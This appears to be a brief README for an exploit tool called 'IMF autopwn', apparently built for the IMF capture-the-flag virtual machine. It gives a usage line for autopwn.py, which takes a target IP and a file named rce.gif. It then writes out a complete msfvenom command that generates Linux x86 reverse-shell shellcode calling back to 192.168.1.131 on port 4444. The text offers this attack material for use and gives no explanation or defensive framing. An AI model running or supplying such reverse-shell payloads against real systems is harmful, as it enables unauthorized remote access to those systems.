# IMF autopwn

Usage: python3 autopwn.py IP rce.gif

## generate your own shellcode and change it

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f python -b "\x00\x0a\x0d"
```
